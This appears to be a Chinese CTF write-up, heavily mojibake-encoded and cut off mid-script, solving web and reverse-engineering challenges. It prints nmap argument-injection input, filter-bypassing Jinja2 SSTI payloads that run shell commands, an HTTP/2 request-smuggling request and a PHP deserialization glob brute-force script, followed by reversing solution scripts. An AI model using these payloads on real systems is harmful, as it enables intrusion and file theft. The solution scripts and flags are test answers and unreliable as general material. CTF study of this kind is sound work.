è¿˜ä¸ä¼šç”¨å—ï¼Ÿ è¿‡æ»¤äº† ? php flag iL oN å‚è€ƒï¼š[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap ä½¿ç”¨nmapè¯»æ–‡ä»¶ï¼Œé€‰é¡¹ -oAï¼Œè¯¥é€‰é¡¹å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«æ”¾åœ¨.nmapï¼Œ.xmlå’Œ.gnmapæ–‡ä»¶ä¸­ã€‚ ä½¿ç”¨ ?ip=127.0.0.1&#39; -i /fl&quot;&quot;ag -oA 1 &#39;ï¼Œå†è®¿é—® 1.nmap å¾—åˆ°flagã€‚ â€‹ klf_2 â€å¯æ¶ï¼Œæˆ‘ä¸ä¿¡ï¼Œæˆ‘ç»å¯¹ä¸æ˜¯klfï¼Œä½ ä»¬æ‰æ˜¯ï¼Œå“ˆå“ˆè¿™æ¬¡æˆ‘å·åœŸé‡æ¥äº†ï¼Œä½ ä»¬è‚¯å®šæ˜¯klfï¼Œæˆ‘è¦å‘å¥³ç¥è¯æ˜è‡ªå·±â€¦â€œ robots.txt å¾—è·¯ç”± /secr3tttï¼Œæµ‹è¯•è¿‡æ»¤å…³é”®å­—æœ‰ï¼š [ ] _ &#39; &quot; \\ config init globals os import request open read 0 137 pop åˆ—ç›®å½•ï¼š 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4ï¼—)%&#125;&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; å¾—åˆ°flagæ–‡ä»¶å fl4gfl4gfl4gï¼Œå†è¯»flagæ–‡ä»¶ï¼š 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4ï¼—)%&#125;&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; â€‹ EZ_Smuggling è¿™æ˜¯ä¸€ä¸ªç®€å•çš„H2è½¬H1çš„å°ç½‘ç«™ï¼Œç«™é•¿è®¤ä¸ºä»–å¾ˆå®‰å…¨ï¼Œæ²¡æœ‰äººèƒ½åœ¨ä»–çš„ç½‘ç«™èµ°ç§ä»»ä½•ä¸œè¥¿ã€‚ é¢˜ç›®é“¾æ¥:https://47.108.56.168:20231/ å¤‡ç”¨é“¾æ¥1:https://47.108.56.168:20232/ å¤‡ç”¨é“¾æ¥2:https://47.108.56.168:20233/ H2.CLè¯·æ±‚èµ°ç§ï¼Œå‚è€ƒï¼š HTTP Request Smuggling â€“ HTTP/2 Downgrade Attack Part 2 æ„é€ ï¼š 123456789GET / HTTP/2Host: 47.108.56.168:20231Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=Content-Length: 0GET /admin HTTP/1.1Host: 47.108.56.168:20231Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=Content-Length: 0 å³å¯å¾—flagï¼šSYC&#123;http2_5muggl1ng_15_1nt3r3st1ng&#125;ã€‚ â€‹ klf_3 â€å¥½å¥½å¥½è¿™éƒ½ç»™ä½ ä»¬åšå‡ºæ¥äº†ï¼Œè¿™æ¬¡æˆ‘æ‹œæ‰˜äº†pursue0hå¸®æˆ‘æ”¶é›†äº†ä½ ä»¬å‰å‡ æ¬¡çš„payloadï¼Œè¿™æ¬¡ç»å¯¹ä¸å¯èƒ½è®©ä½ ä»¬åšå‡ºæ¥ï¼Œä½ ä»¬ç»å¯¹æ˜¯klfâ€œ robots.txt å¾—åˆ°è·¯ç”± /secr3tttï¼ŒåŒklf_2ç›¸åŒæ‰“æ³•å³å¯ã€‚ åˆ—ç›®å½•ï¼š 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4ï¼—)%&#125;&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; å¾—åˆ°flagæ–‡ä»¶å fl4gfl4gfl4gï¼Œå†è¯»flagæ–‡ä»¶ï¼š 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4ï¼—)%&#125;&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; â€‹ Akane! æœ€é€‚åˆæ¢…è²æ–¯ç‰¹çš„ä¸€é¢˜ globåè®®ä¾§ä¿¡é“çˆ†ç ´æ–‡ä»¶åã€‚ 12345678910111213141516from phpserialize import serializeimport base64class Idol: public_Akane=&#x27;glob:///etc/passss&#x27; class Hoshino: public_Ruby=Idol()res = res.replace(b&#x27;&quot;Hoshino&quot;:1&#x27;,b&#x27;&quot;Hoshino&quot;:2&#x27;)print(res)print(base64.b64encode(res))# O:7:&quot;Hoshino&quot;:1:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;# ç»•wakeup# O:7:&quot;Hoshino&quot;:2:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125; 12345678910111213141516171819202122import requestsimport stringimport base64url = &#x27;https://zwgadnbkohe7t6xz02urbct9b.node.game.sycsec.com/?tuizi=&#x27;filename = &#x27;/var/www/html/The************************.php&#x27;dic = string.printablename = &#x27;&#x27;for i in range(24): for j in dic: guess = f&#x27;glob:///var/www/html/The&#123;name+j&#125;&#123;&quot;*&quot;*(23-len(name))&#125;.php&#x27; payload = f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:&#123;len(guess)&#125;:&quot;&#123;guess&#125;&quot;;&#125;&#125;&#125;&#125;&#x27;.encode() r = requests.get(f&#x27;&#123;url&#125;&#123;base64.b64encode(payload).decode()&#125;&#x27;) if &#x27;Kurokawa Akane&#x27; in r.text: name += j print(name) breakprint(name)# S4crEtF1AgFi1EByo2takuXX å†è®¿é—® /var/www/html/TheS4crEtF1AgFi1EByo2takuXX.php å³å¯å¾—flagã€‚ â€‹ REshiftjmp è·³åˆ°å“ªé‡Œå»äº†ï¼Ÿ ç”¨IDAè§£æç¨‹åºå´©æºƒï¼Œæ”¹ç”¨Ghidraè§£æï¼š 123456789101112131415161718192021undefined8 main(void)&#123; uint uVar1; uint uStack12; puts(&quot;flag:&quot;); uStack12 = 0; while( true ) &#123; if (0x21 &lt; (int)uStack12) &#123; puts(&quot;yes&quot;); return 0; &#125; uVar1 = func_0x00101070(); if ((uVar1 ^ uStack12) != (int)(char)rodata[uStack12]) break; uStack12 = uStack12 + 1; &#125; puts(&quot;no&quot;); return 0; &#125; é€»è¾‘ä¸ºç®€å•å¼‚æˆ–æ“ä½œï¼Œè¿˜åŸï¼š 12345rodata = list(bytes.fromhex(&#x27;5358417853366a6438646f547842517b78224d61276373452d7c456c2c6f2f7b5e5c&#x27;))flag = [rodata[i]^i for i in range(41)]print(bytes(flag))# b&#x27;SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;&#x27; â€‹ ç‚¹å‡»å°±é€çš„é€†å‘é¢˜ ä»£ç å¦‚ä½•åˆ°å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶?(è®°å¾—å°†å¾—åˆ°çš„æ­£ç¡®å­—ç¬¦ä¸²åŒ…è£¹ä¸ŠSYC{}!!!!!!!) å°†sæ–‡ä»¶ç¼–è¯‘ï¼šgcc xxx.s -o xxx å…³é”®ä»£ç ï¼š 123456789v7 = __readfsqword(0x28u);strcpy(s2, &quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;);__isoc99_scanf(&amp;unk_2004, s1);for ( i = 0; i &lt;= 31; ++i ) s1[i] += 7;if ( !strcmp(s1, s2) ) printf(&quot;wrong!&quot;);puts(&quot;good!&quot;);return 0; é€»è¾‘ä¸ºROT7ï¼Œcyberchefè¿˜åŸä¸º SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFFã€‚ flagï¼šSYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125; â€‹ easymath åˆ«æ‹…å¿ƒï¼Œæ²¡å­¦è¿‡çº¿æ€§ä»£æ•°ä¹Ÿå¯ä»¥åšå‡ºæ¥ï¼Œå¬è¯´z3è€å¸ˆå¾ˆå‰å®³ã€‚flagè¯·ä½¿ç”¨SYC{}åŒ…è£¹ã€‚ å‰éƒ¨åˆ†ä»£ç ä¸º $\\mathbb{Z}_{32}$ ä¸‹çŸ©é˜µä¹˜æ³•ï¼š$L \\cdot M = I$ åéƒ¨åˆ†ä»£ç ï¼Œæ ¹æ®ä»£ç æµ‹è¯•ä»£ç é€»è¾‘ï¼š 12345678flag = &#x27;c01234_asdzxpoityumnbAOZWXGMY&#x27;table = &#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;pos = [table.index(flag[i])+48 for i in range(len(flag))]print(pos)print(bytes(pos))num = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 19, 22, 26, 27, 28, 29, 31, 32, 50, 51, 52, 53, 54, 55, 56]last = [num[k-48] for k in pos]print(last) é€»è¾‘ä¸ºå°†flagæŒ‰ç…§numæ¥ç¼–åºå·ã€‚ è¿˜åŸè„šæœ¬ï¼š 1234567891011M = matrix(Zmod(32), [[18, 29, 16, 19, 27], [8, 31, 8, 23, 30], [29, 3, 28, 10, 21], [18, 29, 8, 16, 28], [11, 30, 7, 20, 7]])I = identity_matrix(Zmod(32), 5)L = I*M^-1m = L.list()num = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 19, 22, 26, 27, 28, 29, 31, 32, 50, 51, 52, 53, 54, 55, 56]table = &#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;flag = [table[num.index(m[i])] for i in range(25)]print(&#x27;&#x27;.join(flag))# xtd4co_ymiunbbx3Aypsmbzii flagï¼šSYC&#123;xtd4co_ymiunbbx3Aypsmbzii&#125; â€‹ å¹¸è¿æ•°å­— è¯•è¯•ä»Šå¤©çš„è¿åŠ¿ æŒ‰é€»è¾‘è¿˜åŸï¼š 123456789101112131415data = [13, 7, 29, 37, 29, 110, 48, 57, 44, 63, 42, 43, 50, 63, 42, 55, 110, 48, 48, 48, 48, 45, 1, 7, 49, 43, 1, 57, 31, 59, 45, 45, 27, 58, 1, 12, 111, 57, 54, 42, 35]def cal(k): return k*(k+1)//2for k in range(1000): x = [data[i]^(cal(k)%0xd3) for i in range(41)] if x[-1] == 125: print(k, bytes(x)) # b&#x27;SYC&#123;C0ngratulati0nnnns_You_gAessEd_R1ght&#125;&#x27; â€‹ å¬è¯´cppå¾ˆéš¾ï¼Ÿ xxxå¸ˆå‚…å¶ç„¶å¬åˆ°æœ‰äººè¯´cppå¾ˆéš¾ï¼ŒçœŸçš„å¾ˆéš¾å—ï¼Ÿä¸ä¼šå§ï¼Œä¸ä¼šå§ã€‚äºæ˜¯ï¼ŒXå¸ˆå‚…è¿å¿™å‡ºäº†ä¸€é“ç»™å¤§ä¼™å„¿æ¶¨æ¶¨ä¿¡å¿ƒã€‚ åŠ¨è°ƒï¼Œå¾—åˆ°é€»è¾‘ä¸º $[(9+1) \\oplus (f_i+10)]-9-1$ã€‚ çˆ†ç ´è¿˜åŸï¼š 1234567891011121314c = [77, 95, 61, -123, 55, 104, 115, 87, 39, 104, 81, 89, 127, 38, 107, 89, 115, 87, 85, 91, 89, 111, 106, 89, 39, 87, 114, 87, 79, 87, 120, 120, -125]def cal(x): return ((9+1)^(x+10))-9-1f=[]for i in range(len(c)): for j in range(256): if cal(j) == c[i]: f.append(j)print(bytes(f))# b&#x27;SYCAnma1nG_y0u_maKe_it_1alaIa~~&#x27; flagï¼šSYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125; â€‹ ç æ ‘ ä½ ä¼šå®‰å“å—?æˆ‘åæ­£ä¸ä¼š jadxæŸ¥çœ‹apkï¼Œç”¨IDAåœ¨soæ–‡ä»¶ä¸­æŸ¥çœ‹ä¸»è¦é€»è¾‘ï¼š 12345678910111213141516171819202122232425262728_BOOL8 __fastcall Java_com_sky_ezreeeee_MainActivity_I0o0I(__int64 a1, __int64 a2, __int64 a3, __int64 a4)&#123; int i; // [rsp+Ch] [rbp-64h] __int64 v6; // [rsp+10h] [rbp-60h] _BOOL4 v7; // [rsp+1Ch] [rbp-54h] unsigned __int8 *v9; // [rsp+20h] [rbp-50h] unsigned __int8 *v10; // [rsp+28h] [rbp-48h] char dest[40]; // [rsp+40h] [rbp-30h] BYREF unsigned __int64 v12; // [rsp+68h] [rbp-8h] v12 = __readfsqword(0x28u); v10 = (unsigned __int8 *)jstring_2unsigchar(a1, a3); v9 = (unsigned __int8 *)jstring_2unsigchar(a1, a4); v6 = A0OWO0A(v10, v9); memcpy(dest, &amp;unk_14900, 0x23uLL); for ( i = 0; i &lt; 34; ++i ) v7 = *(unsigned __int8 *)(v6 + i) == (unsigned __int8)dest[i]; return v7;&#125;unsigned __int8 *__fastcall A0OWO0A(unsigned __int8 *a1, const unsigned __int8 *a2)&#123; int i; // [rsp+4h] [rbp-14h] for ( i = 0; i &lt; 34; ++i ) a1[i] ^= a2[i % 7]; return a1;&#125; ç®€å•å¼‚æˆ–è¿ç®—ï¼Œæå–å¯†æ–‡ï¼š002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218ï¼Œå¯†é’¥ï¼šSycloveï¼ŒCyberchefå¼‚æˆ–æ“ä½œå¾— SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;ã€‚ â€‹ flower-or-tea Flower ?or tea? or flower tea? å»é™¤jmpèŠ±æŒ‡ä»¤ï¼Œå…¨å±€æ›¿æ¢ 74 03 75 01 XX ä¸º 90 90 90 90 90 (NOP)ã€‚ çœ‹ä¼ªç ä¸ºé­”æ”¹XTEAç®—æ³•ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from Crypto.Util.number import *c = [75, 70, 249, 154, 158, 184, 23, 196, 19, 167, 23, 178, 232, 169, 59, 201, 78, 228, 243, 148, 181, 42, 204, 181, 44, 228, 81, 68, 154, 40, 138, 122, 8, 208, 200, 83, 73, 123, 17, 110, 148, 215, 255, 155, 249, 45, 255, 94, 49, 37, 231, 23, 121, 153, 189, 223, 58, 27, 135, 143, 172, 197, 232, 115, 166, 112, 134, 178, 105, 163, 246, 90, 36, 218, 247, 44, 175, 102, 123, 52, 96, 77, 200, 185, 47, 145, 30, 145, 155, 47, 90, 189, 58, 115, 150, 203, 190, 104, 153, 197, 233, 19, 0, 160, 164, 78, 47, 193, 16, 58, 134, 222, 148, 213, 196, 160, 60, 152, 128, 67, 72, 118, 47, 126, 137, 220, 77, 229, 144, 166, 39, 63, 153, 49, 141, 181, 23, 229, 74, 96, 132, 57, 144, 156, 129, 68, 224, 244, 255, 237, 244, 60]c = [bytes_to_long(bytes(c[4*i:4*i+4])[::-1]) for i in range(len(c)//4)]print(c)k = [32,27,39,44]rounds = 54delta = 0x31415927def decrypt(v): v0 = v[0] v1 = v[1] x = delta * rounds for i in range(rounds): x -= delta x = x &amp; 0xFFFFFFFF v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[x &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) ^ x v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vfl = b&#x27;&#x27;fr = b&#x27;&#x27;for i in range(len(c)//2): cc = c[2*i:2*i+2][::-1] m = decrypt(cc) fr = long_to_bytes(m[0])[::-1] + fr fl += long_to_bytes(m[1])[::-1]print(fl)print(fr)print(fl+fr)# b&#x27;SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;&#x27; â€‹ mySelf Why so serious? åŠ¨è°ƒï¼Œå¾—åˆ°ç¬¬äºŒä¸ªå¯¹è¾“å…¥çš„åŠ å¯†é€»è¾‘ä¸ºTEAç®—æ³•ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *c = [240, 249, 189, 189, 196, 148, 97, 226, 37, 145, 121, 128, 25, 194, 15, 31, 21, 24, 106, 235, 197, 114, 245, 132, 133, 58, 204, 64, 187, 42, 163, 210]c = [bytes_to_long(bytes(c[4*i:4*i+4])[::-1]) for i in range(len(c)//4)]print(c)k = [2,2,3,4]def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vflag = b&#x27;&#x27;for i in range(len(c)//2): cc = c[2*i:2*i+2] m = decrypt(cc,k) flag += long_to_bytes(m[0])[::-1] flag += long_to_bytes(m[1])[::-1]print(flag)# b&#x27;SYC&#123;H0w_7o_R@te_YOurs31f_iNtRo?&#125;&#x27; â€‹ rainbow ç¾ä¸½çš„IDAæ§åˆ¶æµè§†å›¾ like Rainbow! LLVMå»å¹³å¦åŒ–ï¼š python3 deflat.py -f ./rainbow --addr 0x401160 å†ç®€å•é€†å›å»ï¼š 12345678910111213141516from Crypto.Util.number import *c = [0x627B44508E415865,0x847D6C49547E4A57,0x4877646060955B4F,0x622D3C689F7B4D7D]cc = []for k in c: cc += list(long_to_bytes(k)[::-1])for i in range(len(cc)): cc[i] ^= i if i%3 == 0: cc[i] -= 18print(bytes(cc))# SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125; â€‹ å°é»„é¸­ å°é»„é¸­çš„é’¥åŒ™è¢«ä¸€ä¸ªå«æ¯—å¤–çš„å¤§åé¸­å·èµ°äº†,ä½ èƒ½å¸®å®ƒæ‰¾åˆ°é’¥åŒ™å—? pythonåç¼–è¯‘ï¼Œå¾—åˆ°1.pycï¼Œä¿®å¤ä¸º3.7çš„æ–‡ä»¶å¤´ 550d0d0aï¼Œè¿˜åŸpythonä»£ç ã€‚ å¯†æ–‡ï¼š~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH Cyberchefè§£ï¼šROT93+Reverse+ROT12 å¾—åˆ°ï¼šSYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3a&#123;s&#125; ä¿®æ­£ä¸€ä¸‹å¾—flagï¼šSYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125; â€‹ å¯»æ‰¾åˆéŸ³æœªæ¥ æ­£ç¡®çš„è¾“å…¥å³å¯è§£æ•‘Miku~(å›¾æœ‰ç‚¹å¤§äº†å¿ä¸€ä¸‹) Goç¨‹åºï¼Œä»£ç é€»è¾‘ä¸ºRC4ï¼ŒåŠ¨è°ƒå¾— key=&#39;C&#39;*18ã€‚ è¾“å…¥é—®é¢˜ åˆéŸ³æœªæ¥è‰²æ˜¯å¤šå°‘?(è¾“å…¥ä¸º16è¿›åˆ¶,å¦‚0x123abcåˆ™è¾“å…¥123abc) ç­”æ¡ˆ 39C5BBï¼Œæå–å¯†æ–‡ï¼ŒRC4è§£å¯†ï¼š 12345678910111213141516171819202122232425262728293031N = 256S = [0] * Nkey = &#x27;C&#x27;*18Key = [0] * Nt = [ 0x25, 0x6F, 0x3D, 0x6C, 0xF9, 0xE0, 0xCF, 0x3F, 0x2E, 0x24, 0xC6, 0x7B, 0x81, 0xBF, 0x55, 0x4F, 0x0D, 0x99, 0x87, 0x47, 0x48, 0xF7, 0xB9, 0x98, 0xFB, 0x1B, 0x22, 0xEC, 0x84, 0x23, 0xFD, 0xB2]for i in range(N): S[i] = i Key[i] = ord(key[i % len(key)])j = 0for i in range(N): j = (j + S[i] + Key[i]) % N S[i], S[j] = S[j], S[i]i = 0j = 0for k in range(len(t)): i = (i + 1) % N j = (j + S[i]) % N S[i], S[j] = S[j], S[i] t[k] ^= S[(S[i] + S[j]) % N]print(t)print(&#x27;&#x27;.join(chr(k) for k in t))# SYC&#123;N0thing_1s_sEriOus_But_MIku&#125; â€‹ æµªæ¼«è‡³æ­»ä¸æ¸ æŸå¸ˆå‚…æƒ³ç»™ä»–çš„å¥³ç¥è¡¨ç™½ï¼Œä»–å†™äº†ä¸€ä¸ªç½‘ç«™ï¼Œç‚¹çˆ±å¿ƒä¹‹åå°±èƒ½è¾“å…¥å¯†ç ï¼Œä½†æ˜¯åœ¨å†™çš„è¿‡ç¨‹ä¸­ä»–ä¸å°å¿ƒæŠŠæç¤ºçš„å¯†ç åˆ é™¤äº†ï¼Œä½ èƒ½å¸®ä»–æ‰¾å‡ºè¡¨ç™½å¯†ç å—ï¼Ÿ(è¾“å…¥å¯†ç æ—¶ï¼Œè®°å¾—åˆ·æ–°å–”ï¼‰ ps:è¯·å°†å¯†ç åŒ…è£¹SYC{}ä¸Šäº¤ï¼Œä¸”å°†å­—æ¯å…¨æ”¹ä¸ºå¤§å†™ jsæ–‡ä»¶åŠ å¯†é€»è¾‘åˆ†æã€‚ keyä¸ºText1ï¼Œé‡‡ç”¨äº†æ …æ å¯†ç åŠ å¯†å¾—åˆ° 53X211WH04Nï¼Œåˆ©ç”¨ç°æœ‰çš„ decryptRailFence() å‡½æ•°è§£å¯†ï¼š decryptRailFence(&#39;53X211WH04N&#39;,3)=&#39;5201314WXHN&#39; å¯†æ–‡ä¸ºï¼š125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99 åŠ å¯†é€»è¾‘ä¸ºï¼š 12i&lt;14 æ—¶ï¼šc[i]=(m[i]^k[i%7])+10i&gt;=14 æ—¶ï¼šc[i]=(m[i]^k[i-7])+99 è¿˜åŸæ˜æ–‡ä»£ç ï¼š 12345678910111213c = [125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99]k = list(b&#x27;5201314WXHN&#x27;)m = []for i in range(18): if i &lt; 14: m.append((c[i]-10)^k[i%7]) else: m.append((c[i]-99)^k[i-7])print(bytes(m))# b&#x27;FJIAXUEFJIAXUEWXHN&#x27; flagï¼šSYC&#123;FJIAXUEFJIAXUEWXHN&#125; â€‹ AES! AES? Whatâ€™s this ? ç…§é€»è¾‘å°è¯•é€†å‘å³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174import mathv17 = [224, -251, -146, -62, -146, -103, -152, 69, -131, -225, -193, -7, -105, -138, 59, 146, 47, -188, -250, -153, -88, -21, -20, 74, -145, -24, -203, -7, -84, -89, 140, 113]c = [k&amp;0xff for k in v17]v16 = [110, 121, 105, 131, 121, 127, 105, 117, 121, 120, 129, 105, 93, 99, 77, 73]v13 = [122, 118, 107, 109, 111, 42, 115, 120, 121, 127, 126, 42, 131, 121, 127, 124, 42, 112, 118, 107, 113, 68, 42, 20]v14 = v15 = 0v10 = [131, 111, 125, 43, 42, 131, 121, 127, 42, 107, 124, 111, 42, 124, 115, 113, 114, 126, 43, 20, 10, 120, 121, 136, 126, 124, 131, 42, 107, 113, 107, 115, 120, 136, 20, 10, 120, 121, 136, 10]S = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]for i in range(24): v13[i] -= 10print(bytes(v13))# v13 = b&#x27;place inout your flag: \\n&#x27;for i in range(40): v10[i] -= 10print(bytes(v10))# v10 = b&#x27;yes! you are right!\\n\\x00&#x27;# v11 = b&#x27;no~try again~\\n\\x00&#x27;# v12 = b&#x27;no~\\x00&#x27;# len(s) == 32v7 = [k-10 for k in 